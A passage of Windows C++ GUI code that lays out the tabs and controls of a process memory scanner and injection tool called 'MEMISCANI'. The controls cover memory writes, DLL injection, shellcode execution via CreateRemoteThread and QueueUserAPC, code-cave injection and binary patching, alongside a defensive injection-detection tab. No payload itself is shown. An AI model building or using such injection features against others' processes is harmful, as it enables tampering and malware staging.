                ES_MULTILINE|ES_READONLY|ES_AUTOVSCROLL|ES_NOHIDESEL,
                x,y,w,h,hWnd,(HMENU)(intptr_t)id,hInst,NULL);
            SendMessage(he,WM_SETFONT,(WPARAM)hFontMono,TRUE);
            SendMessage(he,EM_SETBKGNDCOLOR,0,(LPARAM)CLR_BG_LIST);
            RCEF_CF cf={};
            cf.cbSize=sizeof(cf);
            cf.dwMask=CFM_COLOR|CFM_FACE;
            cf.crTextColor=CLR_TEXT_LIST;
            strcpy_s(cf.szFaceName,"Consolas");
            SendMessage(he,EM_SETCHARFORMAT,SCF_ALL,(LPARAM)&cf);
            SendMessage(he,EM_SETLIMITTEXT,0,0);
            return he;
        };

        auto MakeDE=[&](HWND par,int x,int y,int w,int h,int id)->HWND{
            HWND he=CreateWindowA("RichEdit20A","",
                WS_CHILD|WS_VISIBLE|WS_BORDER|WS_VSCROLL|WS_HSCROLL|WS_CLIPSIBLINGS|
                ES_MULTILINE|ES_READONLY|ES_AUTOVSCROLL|ES_NOHIDESEL,
                x,y,w,h,par,(HMENU)(intptr_t)id,hInst,NULL);
            SendMessage(he,WM_SETFONT,(WPARAM)hFontMono,TRUE);
            SendMessage(he,EM_SETBKGNDCOLOR,0,(LPARAM)CLR_BG_LIST);
            RCEF_CF cf={};cf.cbSize=sizeof(cf);cf.dwMask=CFM_COLOR|CFM_FACE;
            cf.crTextColor=CLR_TEXT_LIST;strcpy_s(cf.szFaceName,"Consolas");
            SendMessage(he,EM_SETCHARFORMAT,SCF_ALL,(LPARAM)&cf);
            SendMessage(he,EM_SETLIMITTEXT,0,0);return he;
        };
  
        auto B=[&](HWND par,const char* cls,const char* txt,DWORD sty,int x,int y,int w,int h,int id,HFONT f=NULL)->HWND{
            HWND hw=CreateWindowA(cls,txt,WS_CHILD|WS_VISIBLE|sty,x,y,w,h,par,(HMENU)(intptr_t)id,hInst,NULL);
            if(f)SF(hw,f);else SF(hw,hFontNormal);return hw;
        };

      
        HWND hTitle=CreateWindowA("STATIC","MEMISCANI  :)",
            WS_CHILD|WS_VISIBLE,10,8,580,26,hWnd,NULL,hInst,NULL);
        SF(hTitle,hFontTitle);
        HWND hElevNote=CreateWindowA("STATIC",
            IsElevated()?"[ELEVATED - full access]":"[NOT ELEVATED - attach may fail - run as admin]",
            WS_CHILD|WS_VISIBLE,595,14,600,18,hWnd,NULL,hInst,NULL);
        SF(hElevNote,hFontSmall);

        CreateWindowA("STATIC","PID:",WS_CHILD|WS_VISIBLE,10,42,30,22,hWnd,NULL,hInst,NULL);
        hEditPID=CreateWindowA("EDIT","",WS_CHILD|WS_VISIBLE|WS_BORDER|ES_NUMBER,44,40,80,24,hWnd,NULL,hInst,NULL);
        CreateWindowA("BUTTON","Attach",    WS_CHILD|WS_VISIBLE,130,40,72,24,hWnd,(HMENU)ID_BTN_ATTACH,hInst,NULL);
        CreateWindowA("BUTTON","Browse...", WS_CHILD|WS_VISIBLE,207,40,78,24,hWnd,(HMENU)ID_BTN_BROWSE,hInst,NULL);
        hBtnReattach=CreateWindowA("BUTTON","Re-attach",WS_CHILD|WS_VISIBLE,290,40,82,24,hWnd,(HMENU)ID_BTN_REATTACH,hInst,NULL);
        CreateWindowA("BUTTON","Refresh Map",WS_CHILD|WS_VISIBLE,378,40,95,24,hWnd,(HMENU)ID_BTN_REFRESH_MAP,hInst,NULL);
        CreateWindowA("STATIC","Find process:",WS_CHILD|WS_VISIBLE,484,42,88,22,hWnd,NULL,hInst,NULL);
        hEditSearchName=CreateWindowA("EDIT","",WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,576,40,200,24,hWnd,(HMENU)ID_EDIT_SEARCH,hInst,NULL);
        CreateWindowA("BUTTON","Search",WS_CHILD|WS_VISIBLE,781,40,70,24,hWnd,(HMENU)ID_BTN_SEARCH_NAME,hInst,NULL);

        hStaticProcessInfo=CreateWindowA("STATIC","Process: Not attached",WS_CHILD|WS_VISIBLE,10,68,1900,18,hWnd,NULL,hInst,NULL);
        hStaticModuleInfo =CreateWindowA("STATIC","Module: N/A",         WS_CHILD|WS_VISIBLE,10,88,1900,18,hWnd,NULL,hInst,NULL);

        INITCOMMONCONTROLSEX icexTab={sizeof(icexTab),ICC_TAB_CLASSES};
        InitCommonControlsEx(&icexTab);
        hTabCtrl=CreateWindowExA(0,WC_TABCONTROLA,"",
            WS_CHILD|WS_VISIBLE|WS_CLIPSIBLINGS|TCS_HOTTRACK,
            0,108,1920,920,hWnd,(HMENU)ID_TAB_CTRL,hInst,NULL);
        SF(hTabCtrl,hFontNormal);
        {TCITEMA ti={};ti.mask=TCIF_TEXT;
         ti.pszText=(LPSTR)"Memory Scanner"; TabCtrl_InsertItem(hTabCtrl,0,&ti);
         ti.pszText=(LPSTR)"Modules & DLL";  TabCtrl_InsertItem(hTabCtrl,1,&ti);
         ti.pszText=(LPSTR)"Cde Inj";        TabCtrl_InsertItem(hTabCtrl,2,&ti);
         ti.pszText=(LPSTR)"Window Writer";  TabCtrl_InsertItem(hTabCtrl,3,&ti);
         ti.pszText=(LPSTR)"Detect Inj";     TabCtrl_InsertItem(hTabCtrl,4,&ti);
         ti.pszText=(LPSTR)"Shellcode Exec"; TabCtrl_InsertItem(hTabCtrl,5,&ti);
         ti.pszText=(LPSTR)"Verify";         TabCtrl_InsertItem(hTabCtrl,6,&ti);
         ti.pszText = (LPSTR)"Trigger & Monitor"; TabCtrl_InsertItem(hTabCtrl, 7, &ti);
         ti.pszText = (LPSTR)"Pointers & Hooks";  TabCtrl_InsertItem(hTabCtrl, 8, &ti);
         ti.pszText = (LPSTR)"Exports & Handles"; TabCtrl_InsertItem(hTabCtrl, 9, &ti);
         ti.pszText = (LPSTR)"Binary Patcher";    TabCtrl_InsertItem(hTabCtrl,10, &ti);
         ti.pszText = (LPSTR)"Auto Ptr Scan";     TabCtrl_InsertItem(hTabCtrl,11, &ti);
         ti.pszText = (LPSTR)"Disasm Walker";     TabCtrl_InsertItem(hTabCtrl,12, &ti);}
        RECT tabRc;GetClientRect(hTabCtrl,&tabRc);
        TabCtrl_AdjustRect(hTabCtrl,FALSE,&tabRc);
        int px=tabRc.left,py=tabRc.top,pw=tabRc.right-tabRc.left,ph=tabRc.bottom-tabRc.top;
        {static bool regDone=false;
         if(!regDone){WNDCLASSA wcp={};wcp.lpfnWndProc=TabPageProc;wcp.hInstance=hInst;
             wcp.hbrBackground=NULL;wcp.lpszClassName="MemPage";
             RegisterClassA(&wcp);regDone=true;}}
        hPageScan  =CreateWindowA("MemPage","",WS_CHILD|WS_VISIBLE|WS_CLIPSIBLINGS,px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageMods  =CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,          px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageInject=CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,          px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageWnd   =CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,          px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageDetect=CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,          px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageShellcode=CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,       px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageVerify = CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,        px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageTrigger = CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS, px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPagePtrHook = CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS, px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageExpHnd  = CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS, px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPagePatcher = CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS, px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageAutoPtr = CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS, px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hPageDisasmWalk = CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS, px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
        hHdrScan=B(hPageScan,"STATIC","MEMORY SCANNING",0,5,5,220,18,0,hFontSection);

        B(hPageTrigger, "STATIC", "TRIGGER SHELLCODE / DLL EXPORT", 0, 5, 5, 300, 18, 0, hFontSection);
        B(hPageTrigger, "STATIC", "Target address:", 0, 5, 32, 100, 22, 0);
        hEditTriggerAddr = B(hPageTrigger, "EDIT", "0x0", WS_BORDER | ES_AUTOHSCROLL, 110, 30, 200, 24, ID_EDIT_TRIGGER_ADDR, hFontMono);
        B(hPageTrigger, "STATIC", "Method:", 0, 5, 62, 50, 22, 0);
        hCmbTriggerMethod = B(hPageTrigger, "COMBOBOX", "", CBS_DROPDOWNLIST | WS_VSCROLL, 60, 58, 150, 80, ID_CMB_TRIGGER_METHOD);
        SendMessageA(hCmbTriggerMethod, CB_ADDSTRING, 0, (LPARAM)"CreateRemoteThread");
        SendMessageA(hCmbTriggerMethod, CB_ADDSTRING, 0, (LPARAM)"QueueUserAPC");
        SendMessageA(hCmbTriggerMethod, CB_ADDSTRING, 0, (LPARAM)"DLL Export (from Shellcode Exec tab)");
        SendMessage(hCmbTriggerMethod, CB_SETCURSEL, 0, 0);
        B(hPageTrigger, "STATIC", "APC TID:", 0, 220, 58, 60, 22, 0);
        B(hPageTrigger, "BUTTON", "Use last TID", BS_PUSHBUTTON, 370, 58, 80, 24, ID_BTN_USE_LAST_TID, hFontSmall);
        hEditApcTid = B(hPageTrigger, "EDIT", "0", WS_BORDER | ES_NUMBER, 285, 58, 80, 24, ID_EDIT_APC_TID, hFontMono);
        hBtnTrigger = B(hPageTrigger, "BUTTON", "TRIGGER NOW", 0, 380, 58, 120, 28, ID_BTN_TRIGGER);
        B(hPageTrigger, "BUTTON", "Clear Log", 0, 510, 60, 80, 24, ID_BTN_TRIGGER_CLEAR_LOG);
        hLstTriggerLog = MakeDE(hPageTrigger, 5, 100, 1200, 200, ID_LST_TRIGGER_LOG);
        B(hPageTrigger, "STATIC", "Optional: Read output buffer after trigger", 0, 5, 310, 300, 18, 0, hFontSmall);
        B(hPageTrigger, "STATIC", "Output addr:", 0, 5, 332, 80, 22, 0);
        hEditOutputAddr = B(hPageTrigger, "EDIT", "0x0", WS_BORDER | ES_AUTOHSCROLL, 90, 330, 150, 24, ID_EDIT_OUTPUT_ADDR, hFontMono);
        B(hPageTrigger, "STATIC", "Size (bytes):", 0, 250, 332, 80, 22, 0);
        hEditOutputSize = B(hPageTrigger, "EDIT", "16", WS_BORDER | ES_NUMBER, 335, 330, 80, 24, ID_EDIT_OUTPUT_SIZE, hFontMono);
        hBtnReadOutput = B(hPageTrigger, "BUTTON", "Read Output", 0, 425, 330, 100, 24, ID_BTN_READ_OUTPUT);
        B(hPageTrigger, "STATIC", "Sentinel check (same as Verify tab)", 0, 5, 366, 250, 18, 0, hFontSmall);
        hBtnCheckSentinel2 = B(hPageTrigger, "BUTTON", "Check Sentinel", 0, 260, 364, 120, 24, ID_BTN_CHECK_SENTINEL2);

        B(hPageScan,"STATIC","Value:",0,5,32,42,22,0);
        hEditScanValue=B(hPageScan,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,50,28,100,26,0,hFontMono);
        B(hPageScan,"STATIC","Type:",0,154,32,38,22,0);
        hCmbDataType=B(hPageScan,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL,194,28,92,200,ID_CMB_DATA_TYPE);
        for(auto s:{"int32","int16","int8","int64","float","double","String","AOB"})
            SendMessageA(hCmbDataType,CB_ADDSTRING,0,(LPARAM)s);
        SendMessage(hCmbDataType,CB_SETCURSEL,0,0);
        B(hPageScan,"STATIC","Match:",0,290,32,44,22,0);
        hCmbScanType=B(hPageScan,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL,337,28,130,200,ID_CMB_SCAN_TYPE);
        for(auto s:{"Exact Value","Changed","Unchanged","Increased","Decreased","Unknown Initial"})
            SendMessageA(hCmbScanType,CB_ADDSTRING,0,(LPARAM)s);
        SendMessage(hCmbScanType,CB_SETCURSEL,0,0);
        hBtnFirstScan=B(hPageScan,"BUTTON","First Scan",0,471,28,92,26,ID_BTN_FIRST_SCAN);
        hBtnNextScan =B(hPageScan,"BUTTON","Next Scan", 0,567,28,88,26,ID_BTN_NEXT_SCAN);
        
        B(hPageScan,"STATIC","Found:",0,5,63,42,20,0,hFontSmall);
        hStaticScanCount=B(hPageScan,"STATIC","0",0,50,63,80,20,0,hFontSmall);
        B(hPageScan,"BUTTON","Export",  0,133,59,58,22,ID_BTN_EXPORT);
        B(hPageScan,"BUTTON","Clear",   0,195,59,50,22,ID_BTN_CLEAR_SCAN);
        B(hPageScan,"BUTTON","Ptr Scan",0,249,59,70,22,ID_BTN_PTR_SCAN);
        hBtnSendToBuilder=B(hPageScan,"BUTTON","-> SC Builder",0,323,59,100,22,ID_BTN_SEND_TO_BUILDER);
        hBtnCopyResults  =B(hPageScan,"BUTTON","Copy All",     0,427,59,65,22,ID_BTN_COPY_RESULTS);
        
        hScanResultsWnd=MakeDE(hPageScan,5,86,638,540,ID_LST_RESULTS);
        g_origScanEditProc=(WNDPROC)SetWindowLongPtrA(hScanResultsWnd,GWLP_WNDPROC,(LONG_PTR)ScanEditSubclassProc);
        
        hStaticAddressInfo=B(hPageScan,"STATIC","Selected: None  |  Click a scan result",0,5,632,560,18,0,hFontSmall);
        hBtnCopyAddrClip  =B(hPageScan,"BUTTON","Copy Addr",0,568,629,75,22,ID_BTN_COPY_ADDR_CLIP);

        hHdrWatch=B(hPageScan,"STATIC","WATCH LIST  (live 1s refresh)",0,1242,5,240,18,0,hFontSection);
        B(hPageScan,"BUTTON","Add",   0,1488,3,46,22,ID_BTN_ADD_WATCH);
        B(hPageScan,"BUTTON","Remove",0,1537,3,54,22,ID_BTN_REM_WATCH);
        B(hPageScan,"BUTTON","Clear", 0,1595,3,48,22,ID_BTN_CLEAR_WATCH);
        hLstWatchList=MakeDE(hPageScan,1242,28,668,212,ID_LST_WATCH);

        hHdrScan=B(hPageScan,"STATIC","OFFSET TRACKING",0,1242,248,200,18,0,hFontSection);
        B(hPageScan,"STATIC","Tracked offset:",0,1242,272,112,22,0,hFontSmall);
        hEditTrackedOffset=B(hPageScan,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,1357,270,168,24,ID_EDIT_OFFSET,hFontMono);
        hBtnSetOffset =B(hPageScan,"BUTTON","Set",     0,1530,270,44,24,ID_BTN_SET_OFFSET);
        hBtnGotoOffset=B(hPageScan,"BUTTON","Jump",    0,1578,270,62,24,ID_BTN_GOTO_OFFSET);
        B(hPageScan,"BUTTON","Refresh Map",0,1645,270,90,24,ID_BTN_REFRESH_MAP);
        hStaticOffsetInfo=B(hPageScan,"STATIC","No offset tracked.",0,1242,298,668,18,0,hFontSmall);

        hHdrWrite=B(hPageScan,"STATIC","VALUE MODIFICATION",0,1242,322,280,18,0,hFontSection);
        hChkProtect=B(hPageScan,"BUTTON","Bypass read-only (VirtualProtectEx)",BS_AUTOCHECKBOX,1530,320,340,20,ID_CHK_PROTECT_WR,hFontSmall);
        hChkSyscall=B(hPageScan,"BUTTON","Use syscall write (NtWriteVirtualMemory)",BS_AUTOCHECKBOX,1530,345,340,20,ID_CHK_SYSCALL_WR,hFontSmall);
        B(hPageScan,"STATIC","Value:",0,1242,378,44,22,0);
        hEditNewValue=B(hPageScan,"EDIT","",WS_BORDER,1289,376,200,24,0,hFontMono);
        B(hPageScan,"BUTTON","Read",    0,1494,376,50,24,ID_BTN_READ_VAL);
        hBtnWrite =B(hPageScan,"BUTTON","Write",   0,1548,376,58,24,ID_BTN_WRITE);
        B(hPageScan,"BUTTON","Write All",0,1610,376,70,24,ID_BTN_WRITE_ALL);
        hBtnUndo  =B(hPageScan,"BUTTON","Undo",   0,1684,376,50,24,ID_BTN_UNDO);
        hBtnFreeze=B(hPageScan,"BUTTON","Freeze", 0,1738,376,64,24,ID_BTN_FREEZE);
        B(hPageScan,"STATIC","(Write All: write to every scan result at once)",0,1242,406,560,16,0,hFontSmall);

        hHdrStrWriter=B(hPageScan,"STATIC","STRING WRITER  (UTF-8 / UTF-16 to selected addr)",0,1242,398,430,18,0,hFontSection);
        hEditStrWrite=B(hPageScan,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,1242,420,350,24,ID_EDIT_STR_WRITE,hFontMono);
        hBtnWriteUtf8 =B(hPageScan,"BUTTON","Write UTF-8", 0,1596,420,86,24,ID_BTN_WRITE_UTF8);
        hBtnWriteUtf16=B(hPageScan,"BUTTON","Write UTF-16",0,1686,420,86,24,ID_BTN_WRITE_UTF16);
        hBtnReadString=B(hPageScan,"BUTTON","Read String", 0,1776,420,80,24,ID_BTN_READ_STRING);

        hHdrAobPatch=B(hPageScan,"STATIC","AOB PATCH REPLACE",0,1242,452,250,18,0,hFontSection);
        B(hPageScan,"STATIC","Find:",0,1242,476,38,22,0);
        hEditAobPatchFind=B(hPageScan,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,1283,474,290,24,ID_EDIT_AOB_PATCH_FIND,hFontMono);
        B(hPageScan,"STATIC","Repl:",0,1577,476,38,22,0);
        hEditAobPatchRepl=B(hPageScan,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,1615,474,220,24,ID_EDIT_AOB_PATCH_REPL,hFontMono);
        hBtnAobPatch=B(hPageScan,"BUTTON","Patch All",0,1840,474,70,24,ID_BTN_AOB_PATCH);

        hHdrMap=B(hPageScan,"STATIC","MEMORY MAP",0,650,5,200,18,0,hFontSection);
        B(hPageScan,"BUTTON","Refresh Map",0,1175,3,92,22,ID_BTN_REFRESH_MAP);
        hMemoryMapWnd=MakeDE(hPageScan,650,28,590,330,ID_LST_MEMMAP);

        hHdrHex=B(hPageScan,"STATIC","HEX VIEWER  (Ctrl+C to copy)",0,650,366,330,18,0,hFontSection);
        hBtnCopyHex=B(hPageScan,"BUTTON","Copy All",0,1147,364,93,22,ID_BTN_COPY_HEX);
        B(hPageScan,"STATIC","Address:",0,650,390,62,22,0);
        hEditHexAddress=B(hPageScan,"EDIT","0x0",WS_BORDER,715,388,205,24,0,hFontMono);
        hBtnRefreshHex=B(hPageScan,"BUTTON","Go",0,924,388,58,24,ID_BTN_REFRESH_HEX);
        hHexViewWnd=MakeDE(hPageScan,650,416,590,452,ID_LST_HEX);

        hHdrMods=B(hPageMods,"STATIC","LOADED MODULES",0,5,5,280,18,0,hFontSection);
        B(hPageMods,"BUTTON","Refresh",0,1780,3,80,22,ID_BTN_REFRESH_MODS);
        B(hPageMods,"BUTTON","Eject Selected",0,1864,3,95,22,ID_BTN_EJECT_DLL);
        hLstModules=MakeDE(hPageMods,5,28,1890,620,ID_LST_MODULES);

        B(hPageMods, "BUTTON", "❓ Help / Instructions", BS_PUSHBUTTON, 1635, 3, 140, 22, ID_BTN_HELP_MODULES, hFontSmall);
        
        hHdrDllInject=B(hPageMods,"STATIC","DLL INJ",0,5,656,200,18,0,hFontSection);
        B(hPageMods,"STATIC","DLL path:",0,5,682,65,22,0);
        hEditDllPath=B(hPageMods,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,73,680,700,24,ID_EDIT_DLL_PATH,hFontMono);
        hBtnBrowseDll=B(hPageMods,"BUTTON","Browse...",0,778,680,80,24,ID_BTN_BROWSE_DLL);
        hBtnInjectDll=B(hPageMods,"BUTTON","Inject DLL (LoadLibraryA)",0,865,680,190,24,ID_BTN_INJECT_DLL);
        hBtnEjectDll =B(hPageMods,"BUTTON","Eject (FreeLibrary)",0,1060,680,160,24,ID_BTN_EJECT_DLL);
        B(hPageMods,"STATIC","  <- click module line first to eject",0,1225,682,380,20,0,hFontSmall);

        
        hHdrInject=B(hPageInject,"STATIC","SHCODE INJ",0,5,5,300,18,0,hFontSection);
        B(hPageInject, "BUTTON", "❓ Help / Instructions", BS_PUSHBUTTON, 1700, 5, 140, 24, ID_BTN_HELP_INJECT, hFontSmall);
        B(hPageInject,"STATIC","Hex bytes (space-separated, e.g. 90 90 C3):",0,5,28,400,18,0,hFontSmall);
        hEditShellcode=B(hPageInject,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,5,50,640,26,ID_EDIT_SHELLCODE,hFontMono);
        B(hPageInject,"STATIC","Prot:",0,5,84,38,22,0);
        hCmbMemProt=B(hPageInject,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL,46,82,150,120,ID_CMB_MEM_PROT);
        SendMessageA(hCmbMemProt,CB_ADDSTRING,0,(LPARAM)"RWX (exec+write)");
        SendMessageA(hCmbMemProt,CB_ADDSTRING,0,(LPARAM)"RX  (exec only)");
        SendMessage(hCmbMemProt,CB_SETCURSEL,0,0);
        hBtnLoadScFile=B(hPageInject,"BUTTON","Load .bin File",0,202,82,105,24,ID_BTN_LOAD_SC_FILE);
        hBtnInjectCode=B(hPageInject,"BUTTON","Alloc + Execute",0,312,82,115,24,ID_BTN_INJECT_CODE);
        B(hPageInject,"BUTTON","Suspend Threads",0,432,82,118,24,ID_BTN_SUSPEND_THR);
        B(hPageInject,"BUTTON","Resume Threads", 0,555,82,118,24,ID_BTN_RESUME_THR);
        
        hHdrBuilder=B(hPageInject,"STATIC","SHELLCODE BUILDER",0,5,116,260,18,0,hFontSection);
        hBtnAssembler=B(hPageInject,"BUTTON","Open Assembler...",0,640,114,140,22,ID_BTN_ASSEMBLER);
        B(hPageInject,"STATIC","Arch:",0,5,140,40,22,0);
        hCmbArch=B(hPageInject,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL,48,138,68,80,ID_CMB_ARCH);
        SendMessageA(hCmbArch,CB_ADDSTRING,0,(LPARAM)"x64");
        SendMessageA(hCmbArch,CB_ADDSTRING,0,(LPARAM)"x86");
        SendMessage(hCmbArch,CB_SETCURSEL,0,0);
        B(hPageInject,"STATIC","Op:",0,122,140,28,22,0);
        hCmbScOp=B(hPageInject,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL,153,138,150,150,ID_CMB_SC_OP);
        for(auto s:{"Set value","Add value","Subtract","Zero out","NOP sled"})
            SendMessageA(hCmbScOp,CB_ADDSTRING,0,(LPARAM)s);
        SendMessage(hCmbScOp,CB_SETCURSEL,0,0);
        B(hPageInject,"STATIC","Addr:",0,5,168,40,22,0);
        hEditScAddr=B(hPageInject,"EDIT","0x0",WS_BORDER|ES_AUTOHSCROLL,48,166,220,24,ID_EDIT_SC_ADDR,hFontMono);
        B(hPageInject,"STATIC","Val:",0,273,168,32,22,0);
        hEditScVal=B(hPageInject,"EDIT","0",WS_BORDER,308,166,80,24,ID_EDIT_SC_VAL);
        hBtnBuildSc=B(hPageInject,"BUTTON","Build",0,5,196,56,24,ID_BTN_BUILD_SC);
        hEditScResult=B(hPageInject,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,65,196,560,24,ID_EDIT_SC_RESULT,hFontMono);
        hBtnCopySc=B(hPageInject,"BUTTON","-> SC Field",0,630,196,90,24,ID_BTN_COPY_SC);
        
        hHdrCaves=B(hPageInject,"STATIC","CODE CAVE SCANNER",0,740,5,280,18,0,hFontSection);
        B(hPageInject,"STATIC","Min bytes:",0,740,28,72,22,0);
        hEditCaveSize=B(hPageInject,"EDIT","32",WS_BORDER|ES_NUMBER,815,26,56,24,ID_EDIT_CAVE_SIZE);
        hBtnScanCaves=B(hPageInject,"BUTTON","Scan Caves",0,875,26,100,24,ID_BTN_SCAN_CAVES);
        B(hPageInject,"BUTTON","Inject SC to Cave",0,980,26,140,24,ID_BTN_CAVE_INJECT);
        hLstCaves=MakeDE(hPageInject,740,54,1155,360,ID_LST_CAVES);
        hHdrThreads=B(hPageInject,"STATIC","REMOTE THREADS",0,740,422,250,18,0,hFontSection);
        hBtnListThreads=B(hPageInject,"BUTTON","List Threads",0,1625,420,110,22,ID_BTN_LIST_THREADS);
        B(hPageInject,"BUTTON","Kill Selected",0,1740,420,110,22,ID_BTN_KILL_THREAD);
        B(hPageInject, "BUTTON", "Copy TID to APC", BS_PUSHBUTTON, 1625, 468, 110, 22, ID_BTN_COPY_TID_TO_APC, hFontSmall);
        hLstThreads=MakeDE(hPageInject,740,446,1155,430,ID_LST_THREADS);

        
        hHdrWndWriter=B(hPageWnd,"STATIC","WINDOW / CONTROL WRITER",0,5,5,330,18,0,hFontSection);
        B(hPageWnd,"BUTTON","Refresh Windows",0,1680,3,160,22,ID_BTN_REFRESH_WNDS);
        
        hStaticSelWnd=B(hPageWnd,"STATIC","Selected: None  (click a line in the list below)",0,5,28,1880,18,0,hFontSmall);
        
        hLstWindows=MakeDE(hPageWnd,5,50,1205,560,ID_LST_WINDOWS);
        B(hPageWnd, "BUTTON", "❓ Help / Instructions", BS_PUSHBUTTON, 1510, 3, 160, 22, ID_BTN_HELP_WNDWRITER, hFontSmall);
        g_origWndListProc=(WNDPROC)SetWindowLongPtrA(hLstWindows,GWLP_WNDPROC,(LONG_PTR)WndListSubclassProc);
        
        B(hPageWnd,"STATIC","Text to set:",0,5,620,88,22,0);
        hEditWndText=B(hPageWnd,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,96,618,500,24,ID_EDIT_WND_TEXT,hFontMono);
        B(hPageWnd,"BUTTON","Send WM_SETTEXT",0,600,618,135,24,ID_BTN_SEND_SETTEXT);
        B(hPageWnd,"BUTTON","Get WM_GETTEXT", 0,739,618,120,24,ID_BTN_SEND_GETTEXT);
        
        B(hPageWnd,"STATIC","Post Msg:",0,5,652,68,22,0);
        B(hPageWnd,"STATIC","WM:",0,5,678,30,20,0,hFontSmall);
        hEditWndMsg   =B(hPageWnd,"EDIT","0x000",WS_BORDER,38,676,80,22,ID_EDIT_WND_MSG,hFontMono);
        B(hPageWnd,"STATIC","wParam:",0,122,678,52,20,0,hFontSmall);
        hEditWndWParam=B(hPageWnd,"EDIT","0",WS_BORDER,177,676,90,22,ID_EDIT_WND_WPARAM,hFontMono);
        B(hPageWnd,"STATIC","lParam:",0,272,678,52,20,0,hFontSmall);
        hEditWndLParam=B(hPageWnd,"EDIT","0",WS_BORDER,327,676,90,22,ID_EDIT_WND_LPARAM,hFontMono);
        B(hPageWnd,"BUTTON","PostMessage",0,421,676,95,22,ID_BTN_WND_POSTMSG);
        B(hPageWnd,"STATIC","Cmd ID:",0,520,678,52,20,0,hFontSmall);
        hEditWndCmdId=B(hPageWnd,"EDIT","0",WS_BORDER,575,676,70,22,ID_EDIT_WND_CMD_ID,hFontMono);
        B(hPageWnd,"BUTTON","WM_COMMAND",0,649,676,95,22,ID_BTN_WND_SENDCMD);
        
        B(hPageWnd,"STATIC","WINDOW ACTIONS",0,1215,50,240,18,0,hFontSection);
        B(hPageWnd,"BUTTON","Focus / Foreground",0,1215,74,170,26,ID_BTN_WND_FOCUS);
        B(hPageWnd,"BUTTON","Hide",   0,1389,74,70,26,ID_BTN_WND_HIDE);
        B(hPageWnd,"BUTTON","Show",   0,1463,74,70,26,ID_BTN_WND_SHOW);
        B(hPageWnd,"BUTTON","Enable", 0,1537,74,75,26,ID_BTN_WND_ENABLE);
        B(hPageWnd,"BUTTON","Disable",0,1616,74,75,26,ID_BTN_WND_DISABLE);
        B(hPageWnd,"BUTTON","Minimize",0,1215,106,90,26,ID_BTN_WND_MIN);
        B(hPageWnd,"BUTTON","Maximize",0,1309,106,90,26,ID_BTN_WND_MAX);
        B(hPageWnd,"BUTTON","Restore", 0,1403,106,90,26,ID_BTN_WND_RESTORE);
        B(hPageWnd,"BUTTON","Close (WM_CLOSE)",0,1497,106,165,26,ID_BTN_WND_CLOSE_W);


        hHdrDetect=B(hPageDetect,"STATIC","INJECTION DETECTION  (defensive scan against shellcode/stomp/section-mapping)",0,5,5,900,18,0,hFontSection);

        hChkDetectRx    =B(hPageDetect,"BUTTON","Private RX regions (shellcode)",  BS_AUTOCHECKBOX,5,30,260,22,ID_CHK_DETECT_RX,    hFontSmall);
        hChkDetectMapped=B(hPageDetect,"BUTTON","Mapped RX sections (NtMapView)",  BS_AUTOCHECKBOX,270,30,270,22,ID_CHK_DETECT_MAPPED,hFontSmall);
        hChkDetectStomp =B(hPageDetect,"BUTTON","Module .text divergence (stomp)", BS_AUTOCHECKBOX,545,30,260,22,ID_CHK_DETECT_STOMP, hFontSmall);
        hChkDetectThread=B(hPageDetect,"BUTTON","Threads w/ start outside modules",BS_AUTOCHECKBOX,810,30,290,22,ID_CHK_DETECT_THREAD,hFontSmall);

        hChkDetectRwx   =B(hPageDetect,"BUTTON","RWX regions (write+exec)",        BS_AUTOCHECKBOX,5,54,260,22,ID_CHK_DETECT_RWX,   hFontSmall);
        hChkDetectManMap=B(hPageDetect,"BUTTON","Manual-mapped PE images",         BS_AUTOCHECKBOX,270,54,270,22,ID_CHK_DETECT_MANMAP,hFontSmall);
        hChkDetectHijack=B(hPageDetect,"BUTTON","Thread RIP hijack (suspends thr)",BS_AUTOCHECKBOX,545,54,260,22,ID_CHK_DETECT_HIJACK,hFontSmall);
        hChkDetectPath  =B(hPageDetect,"BUTTON","Modules from suspicious paths",   BS_AUTOCHECKBOX,810,54,290,22,ID_CHK_DETECT_PATH, hFontSmall);

        SendMessage(hChkDetectRx,    BM_SETCHECK,BST_CHECKED,0);
